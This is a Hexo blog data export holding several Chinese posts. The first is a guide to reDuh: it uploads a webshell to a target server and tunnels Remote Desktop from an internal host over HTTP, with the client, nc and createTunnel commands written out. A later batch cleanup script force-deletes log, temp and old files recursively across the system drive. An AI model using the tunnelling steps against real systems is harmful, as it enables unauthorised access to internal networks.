/>reDuh服务端下载&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/reDuh-server-all.tgz\" target=\"_blank\" rel=\"noopener noreferrer\">reduh-server-all.gz</a></p>","slug":"内网渗透利器--reDuh（webshell跳板）简单使用说明","published":1,"updated":"2023-04-22T05:38:45.003Z","_id":"clgrjlxju007q7opi1nf0ea9r","comments":1,"layout":"post","photos":[],"link":"","content":"<p>很给力的工具，就是速度稍微有点慢，也不怕被墙。</p><p>&nbsp;</p><p>作者：<a href=\"http://www.sai52.com/archives/848/\" target=\"_blank\" rel=\"noopener noreferrer\">sai52[B.H.S.T]</a></p><p>国外大牛的作品，偶顺手写了个使用说明。E文好的看原文&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.sensepost.com/research/reDuh/</a></p><p>这个工具可以把内网服务器的端口通过http/https隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p><p>本机-------客户端---------（http隧道）-----------服务端------------------内网服务器</p><p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本机执行最好装上JDK。<br /></p><p>把客户端文件解包，这里我把它放到E盘的TEST文件夹</p><p><a href=\"http://huaidan.org/images/2009/03/011.png\"><img src=\"/images/pic/8bcd4bae38a2ff7a4b36d69a.jpg\" width=\"500\" height=\"239\" /></a><br />图01</p><p>把服务端的webshell上传到目标服务器。</p><p><a href=\"http://huaidan.org/images/2009/03/021.png\"><img src=\"/images/pic/b694b1ec8244c245acafd59a.jpg\" width=\"386\" height=\"206\" /></a><br />图02</p><p>目标服务器在内网，开了终端服务。</p><p><a href=\"http://huaidan.org/images/2009/03/031.png\"><img src=\"/images/pic/4cd60c0abe7b25dc2eddd49a.jpg\" width=\"499\" height=\"413\" /></a><br />图03</p><p>命令行下用客户端连接服务端</p><p>E:test&gt;java reDuhClient 目标服务器域名 http 80 /WEBSHELL路径/reDuh.aspx</p><p>liunx下面</p><p>chmod +x reDuchClient.jar</p><p>./reDuchClient.jar 目标服务器域名 http 80 /WEBSHELL路径/reDuh.aspx</p><p>现在版本更新了，命令也有所改变，自己看一个帮助吧。或者直接程序文件不加参数，会给你提示的</p><p><a href=\"http://huaidan.org/images/2009/03/041.png\"><img src=\"/images/pic/0a297beac532a84cb80e2d80.jpg\" width=\"500\" height=\"112\" /></a><br />图04</p><p>新开一个命令行，用NC连接本机1010端口。</p><p>H:&gt;nc -vv localhost 1010</p><p><a href=\"http://huaidan.org/images/2009/03/051.png\"><img src=\"/images/pic/86d04302dc0c317d7bec2c80.jpg\" width=\"499\" height=\"96\" /></a><br />图05</p><p>连接成功会有欢迎提示，之后输入命令</p><p>&gt;&gt;[createTunnel]1234:127.0.0.1:3389</p><p>前面的1234是本机连接用的端口，中间的ip地址是目标服务器的（可以是webshell所在服务器也可以是和它同内网的服务器），后面的3389是欲连接目标服务器的端口。</p><p>成功后两个命令行窗口都会有成功提示。</p><p><a href=\"http://huaidan.org/images/2009/03/061.png\"><img src=\"/images/pic/be385b3c463df29f54e72380.jpg\" width=\"500\" height=\"121\" /></a><br />图06</p><p><a href=\"http://huaidan.org/images/2009/03/071.png\"><img src=\"/images/pic/f13031355ae2a7aea3cc2b9a.jpg\" width=\"500\" height=\"135\" /></a><br />图07</p><p>这时通道已经建立，你连接本机的1234端口就相当于连接到目标服务器的3389端口了。</p><p><a href=\"http://huaidan.org/images/2009/03/081.png\"><img src=\"/images/pic/cc0fd6acd9902abf7cd92a9a.jpg\" width=\"407\" height=\"231\" /></a><br />图08</p><p><a href=\"http://huaidan.org/images/2009/03/091.png\"><img src=\"/images/pic/a606c20d84dfdd9436d12280.jpg\" width=\"499\" height=\"243\" /></a><br />图09</p><p>数据的传递过程</p><p><a href=\"http://huaidan.org/images/2009/03/101.png\"><img src=\"/images/pic/3f3701ef54d3bfa22f2e2180.jpg\" width=\"499\" height=\"134\" /></a><br />图10</p><p>需要注意的是用此工具转发数据速度很慢，连接的时候应尽量把mstsc的颜色设置调低些。</p><p>reDuh客户端下载&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/reDuhClient-0.3.zip\" target=\"_blank\" rel=\"noopener noreferrer\">reduhclient-0.3.zip</a><br />reDuh服务端下载&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/reDuh-server-all.tgz\" target=\"_blank\" rel=\"noopener noreferrer\">reduh-server-all.gz</a></p>","site":{"data":{}},"excerpt":"","more":"<p>很给力的工具，就是速度稍微有点慢，也不怕被墙。</p><p>&nbsp;</p><p>作者：<a href=\"http://www.sai52.com/archives/848/\" target=\"_blank\" rel=\"noopener noreferrer\">sai52[B.H.S.T]</a></p><p>国外大牛的作品，偶顺手写了个使用说明。E文好的看原文&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.sensepost.com/research/reDuh/</a></p><p>这个工具可以把内网服务器的端口通过http/https隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p><p>本机-------客户端---------（http隧道）-----------服务端------------------内网服务器</p><p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本机执行最好装上JDK。<br /></p><p>把客户端文件解包，这里我把它放到E盘的TEST文件夹</p><p><a href=\"http://huaidan.org/images/2009/03/011.png\"><img src=\"/images/pic/8bcd4bae38a2ff7a4b36d69a.jpg\" width=\"500\" height=\"239\" /></a><br />图01</p><p>把服务端的webshell上传到目标服务器。</p><p><a href=\"http://huaidan.org/images/2009/03/021.png\"><img src=\"/images/pic/b694b1ec8244c245acafd59a.jpg\" width=\"386\" height=\"206\" /></a><br />图02</p><p>目标服务器在内网，开了终端服务。</p><p><a href=\"http://huaidan.org/images/2009/03/031.png\"><img src=\"/images/pic/4cd60c0abe7b25dc2eddd49a.jpg\" width=\"499\" height=\"413\" /></a><br />图03</p><p>命令行下用客户端连接服务端</p><p>E:test&gt;java reDuhClient 目标服务器域名 http 80 /WEBSHELL路径/reDuh.aspx</p><p>liunx下面</p><p>chmod +x reDuchClient.jar</p><p>./reDuchClient.jar 目标服务器域名 http 80 /WEBSHELL路径/reDuh.aspx</p><p>现在版本更新了，命令也有所改变，自己看一个帮助吧。或者直接程序文件不加参数，会给你提示的</p><p><a href=\"http://huaidan.org/images/2009/03/041.png\"><img src=\"/images/pic/0a297beac532a84cb80e2d80.jpg\" width=\"500\" height=\"112\" /></a><br />图04</p><p>新开一个命令行，用NC连接本机1010端口。</p><p>H:&gt;nc -vv localhost 1010</p><p><a href=\"http://huaidan.org/images/2009/03/051.png\"><img src=\"/images/pic/86d04302dc0c317d7bec2c80.jpg\" width=\"499\" height=\"96\" /></a><br />图05</p><p>连接成功会有欢迎提示，之后输入命令</p><p>&gt;&gt;[createTunnel]1234:127.0.0.1:3389</p><p>前面的1234是本机连接用的端口，中间的ip地址是目标服务器的（可以是webshell所在服务器也可以是和它同内网的服务器），后面的3389是欲连接目标服务器的端口。</p><p>成功后两个命令行窗口都会有成功提示。</p><p><a href=\"http://huaidan.org/images/2009/03/061.png\"><img src=\"/images/pic/be385b3c463df29f54e72380.jpg\" width=\"500\" height=\"121\" /></a><br />图06</p><p><a href=\"http://huaidan.org/images/2009/03/071.png\"><img src=\"/images/pic/f13031355ae2a7aea3cc2b9a.jpg\" width=\"500\" height=\"135\" /></a><br />图07</p><p>这时通道已经建立，你连接本机的1234端口就相当于连接到目标服务器的3389端口了。</p><p><a href=\"http://huaidan.org/images/2009/03/081.png\"><img src=\"/images/pic/cc0fd6acd9902abf7cd92a9a.jpg\" width=\"407\" height=\"231\" /></a><br />图08</p><p><a href=\"http://huaidan.org/images/2009/03/091.png\"><img src=\"/images/pic/a606c20d84dfdd9436d12280.jpg\" width=\"499\" height=\"243\" /></a><br />图09</p><p>数据的传递过程</p><p><a href=\"http://huaidan.org/images/2009/03/101.png\"><img src=\"/images/pic/3f3701ef54d3bfa22f2e2180.jpg\" width=\"499\" height=\"134\" /></a><br />图10</p><p>需要注意的是用此工具转发数据速度很慢，连接的时候应尽量把mstsc的颜色设置调低些。</p><p>reDuh客户端下载&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/reDuhClient-0.3.zip\" target=\"_blank\" rel=\"noopener noreferrer\">reduhclient-0.3.zip</a><br />reDuh服务端下载&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/reDuh-server-all.tgz\" target=\"_blank\" rel=\"noopener noreferrer\">reduh-server-all.gz</a></p>"},{"title":"截取输入内容的字数","date":"2010-04-16T11:36:00.000Z","_content":"很好价值的一段代码，感觉挺好、<br /><br />@echo off<br />set /p var=请输入:<br />set count=0<br />:loop<br />if &quot;%var%&quot;==&quot;&quot; goto jump<br />set var=%var:~0,-1%<br />:去掉一个字符<br />set /a count=%count%+1<br />goto loop<br />:循环,直到var是空。输出字符count<br />:jump<br />echo %count%<br />pause","source":"_posts/截取输入内容的字数.md","raw":"title: 截取输入内容的字数\ncategories: [Windows,操作系统]\ntags: []\ndate: 2010-04-16 19:36:00\n---\n很好价值的一段代码，感觉挺好、<br /><br />@echo off<br />set /p var=请输入:<br />set count=0<br />:loop<br />if &quot;%var%&quot;==&quot;&quot; goto jump<br />set var=%var:~0,-1%<br />:去掉一个字符<br />set /a count=%count%+1<br />goto loop<br />:循环,直到var是空。输出字符count<br />:jump<br />echo %count%<br />pause","slug":"截取输入内容的字数","published":1,"updated":"2023-04-22T05:38:45.074Z","_id":"clgrjlxjv007s7opic0j70sr2","comments":1,"layout":"post","photos":[],"link":"","content":"<p>很好价值的一段代码，感觉挺好、<br /><br />@echo off<br />set &#x2F;p var&#x3D;请输入:<br />set count&#x3D;0<br />:loop<br />if &quot;%var%&quot;&#x3D;&#x3D;&quot;&quot; goto jump<br />set var&#x3D;%var:~0,-1%<br />:去掉一个字符<br />set &#x2F;a count&#x3D;%count%+1<br />goto loop<br />:循环,直到var是空。输出字符count<br />:jump<br />echo %count%<br />pause</p>\n","site":{"data":{}},"excerpt":"","more":"<p>很好价值的一段代码，感觉挺好、<br /><br />@echo off<br />set &#x2F;p var&#x3D;请输入:<br />set count&#x3D;0<br />:loop<br />if &quot;%var%&quot;&#x3D;&#x3D;&quot;&quot; goto jump<br />set var&#x3D;%var:~0,-1%<br />:去掉一个字符<br />set &#x2F;a count&#x3D;%count%+1<br />goto loop<br />:循环,直到var是空。输出字符count<br />:jump<br />echo %count%<br />pause</p>\n"},{"title":"如何使用命令trap来捕捉信号","date":"2010-08-18T01:31:00.000Z","_content":"　　它有三种形式分别对应三种不同的信号回应方式.<br />第一种:<br />trap &quot;commands&quot; signal-list<br />trap &quot;commands&quot; 数字<br />当脚本收到signal-list清单内列出的信号时,trap命令执行双引号中的命令.<br />第二种:<br />trap signal-list<br />trap不指定任何命令,接受信号的默认操作.默认操作是结束进程的运行.<br />第三种:<br />trap &quot;&quot; &quot;&quot; signal-list<br />trap命令指定一个空命令串,允许忽视信号.<br />Linux信号简介<br />1) SIGHUP 本信号在用户终端连接(正常或非正常)结束时发出, 通常是在终端的控制进程结束时, 通知同一session内的各个作业, 这时它们与控制终端不再关联.<br />2) SIGINT 程序终止(interrupt)信号, 在用户键入INTR字符(通常是Ctrl-C)时发出<br />3) SIGQUIT 和SIGINT类似, 但由QUIT字符(通常是Ctrl-)来控制. 进程在因收到SIGQUIT退出时会产生core文件, 在这个意义上类似于一个程序错误信号.<br />4) SIGILL 执行了非法指令. 通常是因为可执行文件本身出现错误, 或者试图执行数据段. 堆栈溢出时也有可能产生这个信号.<br />5) SIGTRAP 由断点指令或其它trap指令产生. 由debugger使用.<br />6) SIGABRT 程序自己发现错误并调用abort时产生.<br />7) SIGIOT 在PDP-11上由iot指令产生, 在其它机器上和SIGABRT一样.<br />8) SIGBUS 非法地址, 包括内存地址对齐(alignment)出错. eg: 访问一个四个字长的整数, 但其地址不是4的倍数.<br />9) SIGFPE 在发生致命的算术运算错误时发出. 不仅包括浮点运算错误, 还包括溢出及除数为0等其它所有的算术的错误.<br />10) SIGKILL 用来立即结束程序的运行. 本信号不能被阻塞, 处理和忽略.<br />11) SIGUSR1 留给用户使用<br />12) SIGSEGV 试图访问未分配给自己的内存, 或试图往没有写权限的内存地址写数据.<br />13) SIGUSR2 留给用户使用<br />14) SIGPIPE Broken pipe<br />15) SIGALRM 时钟定时信号, 计算的是实际的时间或时钟时间. alarm函数使用该信号.<br />16) SIGTERM 程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理. 通常用来要求程序自己正常退出. shell命令kill缺省产生这个信号.<br />17) SIGCHLD 子进程结束时, 父进程会收到这个信号.<br />18) SIGCONT 让一个停止(stopped)的进程继续执行. 本信号不能被阻塞. 可以用一个handler来让程序在由stopped状态变为继续执行时完成特定的工作. 例如, 重新显示提示符<br />19) SIGSTOP 停止(stopped)进程的执行. 注意它和terminate以及interrupt的区别: 该进程还未结束, 只是暂停执行. 本信号不能被阻塞, 处理或忽略.<br />20) SIGTSTP 停止进程的运行, 但该信号可以被处理和忽略. 用户键入SUSP字符时(通常是Ctrl-Z)发出这个信号<br />21) SIGTTIN 当后台作业要从用户终端读数据时, 该作业中的所有进程会收到SIGTTIN信号. 缺省时这些进程会停止执行.<br />22) SIGTTOU 类似于SIGTTIN, 但在写终端(或修改终端模式)时收到.<br />23) SIGURG 有紧急数据或out-of-band数据到达socket时产生.<br />24) SIGXCPU 超过CPU时间资源限制. 这个限制可以由getrlimit/setrlimit来读取/改变<br />25) SIGXFSZ 超过文件大小资源限制.<br />26) SIGVTALRM 虚拟时钟信号. 类似于SIGALRM, 但是计算的是该进程占用的CPU时间.<br />27) SIGPROF 类似于SIGALRM/SIGVTALRM, 但包括该进程用的CPU时间以及系统调用的时间.<br />28) SIGWINCH 窗口大小改变时发出.<br />29) SIGIO 文件描述符准备就绪, 可以开始进行输入/输出操作.<br />30) SIGPWR Power failure","source":"_posts/如何使用命令trap来捕捉信号.md","raw":"title: 如何使用命令trap来捕捉信号\ncategories: [Shell编程]\ntags: []\ndate: 2010-08-18 09:31:00\n---\n　　它有三种形式分别对应三种不同的信号回应方式.<br />第一种:<br />trap &quot;commands&quot; signal-list<br />trap &quot;commands&quot; 数字<br />当脚本收到signal-list清单内列出的信号时,trap命令执行双引号中的命令.<br />第二种:<br />trap signal-list<br />trap不指定任何命令,接受信号的默认操作.默认操作是结束进程的运行.<br />第三种:<br />trap &quot;&quot; &quot;&quot; signal-list<br />trap命令指定一个空命令串,允许忽视信号.<br />Linux信号简介<br />1) SIGHUP 本信号在用户终端连接(正常或非正常)结束时发出, 通常是在终端的控制进程结束时, 通知同一session内的各个作业, 这时它们与控制终端不再关联.<br />2) SIGINT 程序终止(interrupt)信号, 在用户键入INTR字符(通常是Ctrl-C)时发出<br />3) SIGQUIT 和SIGINT类似, 但由QUIT字符(通常是Ctrl-)来控制. 进程在因收到SIGQUIT退出时会产生core文件, 在这个意义上类似于一个程序错误信号.<br />4) SIGILL 执行了非法指令. 通常是因为可执行文件本身出现错误, 或者试图执行数据段. 堆栈溢出时也有可能产生这个信号.<br />5) SIGTRAP 由断点指令或其它trap指令产生. 由debugger使用.<br />6) SIGABRT 程序自己发现错误并调用abort时产生.<br />7) SIGIOT 在PDP-11上由iot指令产生, 在其它机器上和SIGABRT一样.<br />8) SIGBUS 非法地址, 包括内存地址对齐(alignment)出错. eg: 访问一个四个字长的整数, 但其地址不是4的倍数.<br />9) SIGFPE 在发生致命的算术运算错误时发出. 不仅包括浮点运算错误, 还包括溢出及除数为0等其它所有的算术的错误.<br />10) SIGKILL 用来立即结束程序的运行. 本信号不能被阻塞, 处理和忽略.<br />11) SIGUSR1 留给用户使用<br />12) SIGSEGV 试图访问未分配给自己的内存, 或试图往没有写权限的内存地址写数据.<br />13) SIGUSR2 留给用户使用<br />14) SIGPIPE Broken pipe<br />15) SIGALRM 时钟定时信号, 计算的是实际的时间或时钟时间. alarm函数使用该信号.<br />16) SIGTERM 程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理. 通常用来要求程序自己正常退出. shell命令kill缺省产生这个信号.<br />17) SIGCHLD 子进程结束时, 父进程会收到这个信号.<br />18) SIGCONT 让一个停止(stopped)的进程继续执行. 本信号不能被阻塞. 可以用一个handler来让程序在由stopped状态变为继续执行时完成特定的工作. 例如, 重新显示提示符<br />19) SIGSTOP 停止(stopped)进程的执行. 注意它和terminate以及interrupt的区别: 该进程还未结束, 只是暂停执行. 本信号不能被阻塞, 处理或忽略.<br />20) SIGTSTP 停止进程的运行, 但该信号可以被处理和忽略. 用户键入SUSP字符时(通常是Ctrl-Z)发出这个信号<br />21) SIGTTIN 当后台作业要从用户终端读数据时, 该作业中的所有进程会收到SIGTTIN信号. 缺省时这些进程会停止执行.<br />22) SIGTTOU 类似于SIGTTIN, 但在写终端(或修改终端模式)时收到.<br />23) SIGURG 有紧急数据或out-of-band数据到达socket时产生.<br />24) SIGXCPU 超过CPU时间资源限制. 这个限制可以由getrlimit/setrlimit来读取/改变<br />25) SIGXFSZ 超过文件大小资源限制.<br />26) SIGVTALRM 虚拟时钟信号. 类似于SIGALRM, 但是计算的是该进程占用的CPU时间.<br />27) SIGPROF 类似于SIGALRM/SIGVTALRM, 但包括该进程用的CPU时间以及系统调用的时间.<br />28) SIGWINCH 窗口大小改变时发出.<br />29) SIGIO 文件描述符准备就绪, 可以开始进行输入/输出操作.<br />30) SIGPWR Power failure","slug":"如何使用命令trap来捕捉信号","published":1,"updated":"2023-04-22T05:38:45.027Z","_id":"clgrjlxjv007u7opifds76e2y","comments":1,"layout":"post","photos":[],"link":"","content":"<p>　　它有三种形式分别对应三种不同的信号回应方式.<br />第一种:<br />trap &quot;commands&quot; signal-list<br />trap &quot;commands&quot; 数字<br />当脚本收到signal-list清单内列出的信号时,trap命令执行双引号中的命令.<br />第二种:<br />trap signal-list<br />trap不指定任何命令,接受信号的默认操作.默认操作是结束进程的运行.<br />第三种:<br />trap &quot;&quot; &quot;&quot; signal-list<br />trap命令指定一个空命令串,允许忽视信号.<br />Linux信号简介<br />1) SIGHUP 本信号在用户终端连接(正常或非正常)结束时发出, 通常是在终端的控制进程结束时, 通知同一session内的各个作业, 这时它们与控制终端不再关联.<br />2) SIGINT 程序终止(interrupt)信号, 在用户键入INTR字符(通常是Ctrl-C)时发出<br />3) SIGQUIT 和SIGINT类似, 但由QUIT字符(通常是Ctrl-)来控制. 进程在因收到SIGQUIT退出时会产生core文件, 在这个意义上类似于一个程序错误信号.<br />4) SIGILL 执行了非法指令. 通常是因为可执行文件本身出现错误, 或者试图执行数据段. 堆栈溢出时也有可能产生这个信号.<br />5) SIGTRAP 由断点指令或其它trap指令产生. 由debugger使用.<br />6) SIGABRT 程序自己发现错误并调用abort时产生.<br />7) SIGIOT 在PDP-11上由iot指令产生, 在其它机器上和SIGABRT一样.<br />8) SIGBUS 非法地址, 包括内存地址对齐(alignment)出错. eg: 访问一个四个字长的整数, 但其地址不是4的倍数.<br />9) SIGFPE 在发生致命的算术运算错误时发出. 不仅包括浮点运算错误, 还包括溢出及除数为0等其它所有的算术的错误.<br />10) SIGKILL 用来立即结束程序的运行. 本信号不能被阻塞, 处理和忽略.<br />11) SIGUSR1 留给用户使用<br />12) SIGSEGV 试图访问未分配给自己的内存, 或试图往没有写权限的内存地址写数据.<br />13) SIGUSR2 留给用户使用<br />14) SIGPIPE Broken pipe<br />15) SIGALRM 时钟定时信号, 计算的是实际的时间或时钟时间. alarm函数使用该信号.<br />16) SIGTERM 程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理. 通常用来要求程序自己正常退出. shell命令kill缺省产生这个信号.<br />17) SIGCHLD 子进程结束时, 父进程会收到这个信号.<br />18) SIGCONT 让一个停止(stopped)的进程继续执行. 本信号不能被阻塞. 可以用一个handler来让程序在由stopped状态变为继续执行时完成特定的工作. 例如, 重新显示提示符<br />19) SIGSTOP 停止(stopped)进程的执行. 注意它和terminate以及interrupt的区别: 该进程还未结束, 只是暂停执行. 本信号不能被阻塞, 处理或忽略.<br />20) SIGTSTP 停止进程的运行, 但该信号可以被处理和忽略. 用户键入SUSP字符时(通常是Ctrl-Z)发出这个信号<br />21) SIGTTIN 当后台作业要从用户终端读数据时, 该作业中的所有进程会收到SIGTTIN信号. 缺省时这些进程会停止执行.<br />22) SIGTTOU 类似于SIGTTIN, 但在写终端(或修改终端模式)时收到.<br />23) SIGURG 有紧急数据或out-of-band数据到达socket时产生.<br />24) SIGXCPU 超过CPU时间资源限制. 这个限制可以由getrlimit&#x2F;setrlimit来读取&#x2F;改变<br />25) SIGXFSZ 超过文件大小资源限制.<br />26) SIGVTALRM 虚拟时钟信号. 类似于SIGALRM, 但是计算的是该进程占用的CPU时间.<br />27) SIGPROF 类似于SIGALRM&#x2F;SIGVTALRM, 但包括该进程用的CPU时间以及系统调用的时间.<br />28) SIGWINCH 窗口大小改变时发出.<br />29) SIGIO 文件描述符准备就绪, 可以开始进行输入&#x2F;输出操作.<br />30) SIGPWR Power failure</p>\n","site":{"data":{}},"excerpt":"","more":"<p>　　它有三种形式分别对应三种不同的信号回应方式.<br />第一种:<br />trap &quot;commands&quot; signal-list<br />trap &quot;commands&quot; 数字<br />当脚本收到signal-list清单内列出的信号时,trap命令执行双引号中的命令.<br />第二种:<br />trap signal-list<br />trap不指定任何命令,接受信号的默认操作.默认操作是结束进程的运行.<br />第三种:<br />trap &quot;&quot; &quot;&quot; signal-list<br />trap命令指定一个空命令串,允许忽视信号.<br />Linux信号简介<br />1) SIGHUP 本信号在用户终端连接(正常或非正常)结束时发出, 通常是在终端的控制进程结束时, 通知同一session内的各个作业, 这时它们与控制终端不再关联.<br />2) SIGINT 程序终止(interrupt)信号, 在用户键入INTR字符(通常是Ctrl-C)时发出<br />3) SIGQUIT 和SIGINT类似, 但由QUIT字符(通常是Ctrl-)来控制. 进程在因收到SIGQUIT退出时会产生core文件, 在这个意义上类似于一个程序错误信号.<br />4) SIGILL 执行了非法指令. 通常是因为可执行文件本身出现错误, 或者试图执行数据段. 堆栈溢出时也有可能产生这个信号.<br />5) SIGTRAP 由断点指令或其它trap指令产生. 由debugger使用.<br />6) SIGABRT 程序自己发现错误并调用abort时产生.<br />7) SIGIOT 在PDP-11上由iot指令产生, 在其它机器上和SIGABRT一样.<br />8) SIGBUS 非法地址, 包括内存地址对齐(alignment)出错. eg: 访问一个四个字长的整数, 但其地址不是4的倍数.<br />9) SIGFPE 在发生致命的算术运算错误时发出. 不仅包括浮点运算错误, 还包括溢出及除数为0等其它所有的算术的错误.<br />10) SIGKILL 用来立即结束程序的运行. 本信号不能被阻塞, 处理和忽略.<br />11) SIGUSR1 留给用户使用<br />12) SIGSEGV 试图访问未分配给自己的内存, 或试图往没有写权限的内存地址写数据.<br />13) SIGUSR2 留给用户使用<br />14) SIGPIPE Broken pipe<br />15) SIGALRM 时钟定时信号, 计算的是实际的时间或时钟时间. alarm函数使用该信号.<br />16) SIGTERM 程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理. 通常用来要求程序自己正常退出. shell命令kill缺省产生这个信号.<br />17) SIGCHLD 子进程结束时, 父进程会收到这个信号.<br />18) SIGCONT 让一个停止(stopped)的进程继续执行. 本信号不能被阻塞. 可以用一个handler来让程序在由stopped状态变为继续执行时完成特定的工作. 例如, 重新显示提示符<br />19) SIGSTOP 停止(stopped)进程的执行. 注意它和terminate以及interrupt的区别: 该进程还未结束, 只是暂停执行. 本信号不能被阻塞, 处理或忽略.<br />20) SIGTSTP 停止进程的运行, 但该信号可以被处理和忽略. 用户键入SUSP字符时(通常是Ctrl-Z)发出这个信号<br />21) SIGTTIN 当后台作业要从用户终端读数据时, 该作业中的所有进程会收到SIGTTIN信号. 缺省时这些进程会停止执行.<br />22) SIGTTOU 类似于SIGTTIN, 但在写终端(或修改终端模式)时收到.<br />23) SIGURG 有紧急数据或out-of-band数据到达socket时产生.<br />24) SIGXCPU 超过CPU时间资源限制. 这个限制可以由getrlimit&#x2F;setrlimit来读取&#x2F;改变<br />25) SIGXFSZ 超过文件大小资源限制.<br />26) SIGVTALRM 虚拟时钟信号. 类似于SIGALRM, 但是计算的是该进程占用的CPU时间.<br />27) SIGPROF 类似于SIGALRM&#x2F;SIGVTALRM, 但包括该进程用的CPU时间以及系统调用的时间.<br />28) SIGWINCH 窗口大小改变时发出.<br />29) SIGIO 文件描述符准备就绪, 可以开始进行输入&#x2F;输出操作.<br />30) SIGPWR Power failure</p>\n"},{"title":"纠结","date":"2011-10-26T06:57:00.000Z","_content":"<p>做大事着，不能前怕狼后怕虎。凡事要冷静分析，淡定，淡定，淡定。<img src=\"/images/pic/other_site/img_baidu_j_0003.gif\" /></p>","source":"_posts/纠结.md","raw":"title: 纠结\ncategories: [生活感想]\ntags: []\ndate: 2011-10-26 14:57:00\n---\n<p>做大事着，不能前怕狼后怕虎。凡事要冷静分析，淡定，淡定，淡定。<img src=\"/images/pic/other_site/img_baidu_j_0003.gif\" /></p>","slug":"纠结","published":1,"updated":"2023-04-22T05:38:45.125Z","_id":"clgrjlxjx007x7opigjje97sm","comments":1,"layout":"post","photos":[],"link":"","content":"<p>做大事着，不能前怕狼后怕虎。凡事要冷静分析，淡定，淡定，淡定。<img src=\"/images/pic/other_site/img_baidu_j_0003.gif\" /></p>","site":{"data":{}},"excerpt":"","more":"<p>做大事着，不能前怕狼后怕虎。凡事要冷静分析，淡定，淡定，淡定。<img src=\"/images/pic/other_site/img_baidu_j_0003.gif\" /></p>"},{"title":"批处理清理你电脑中的垃圾","date":"2010-04-07T11:03:00.000Z","_content":"今天朋友让我给弄个清理垃圾的软件。于是就自己DIY了个东西。也没有什么技术含量。<br /><br />代码如下：<br />@echo off<br />color a<br />mode con cols=70 lines=12 &amp;color A<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo ⊙&#160;&#160; 欢迎使用由&quot;key1088&quot;制作的清除系统垃圾文件批处理小程序&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 清理垃圾文件，速度由电脑文件大小而定&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙-.-⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 请勿关闭本窗口。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ⊙<br />echo ⊙ ----------------------------------------DIY:key1088------&#160;&#160; ⊙<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo 按任意键开始工作<br />pause&gt;nul<br />cls<br />RD %windir%$hf_mig$ /Q /S<br /><br />dir %windir%$NtUninstall* /a:d /b &gt;%windir%2950800.txt<br /><br />for /f %%i in (%windir%2950800.txt) do rd %windir%%%i /s /q<br /><br />del %windir%2950800.txt /f /q<br /><br />del %windir%KB*.log /f /q<br /><br />del /f /s /q %systemdrive%*.tmp<br /><br />del /f /s /q %systemdrive%*._mp<br /><br />del /f /s /q %systemdrive%*.log<br /><br />del /f /s /q %systemdrive%*.gid<br /><br />del /f /s /q %systemdrive%*.chk<br /><br />del /f /s /q %systemdrive%*.old<br /><br />del /f /s /q %systemdrive%recycled*.*<br /><br />del /f 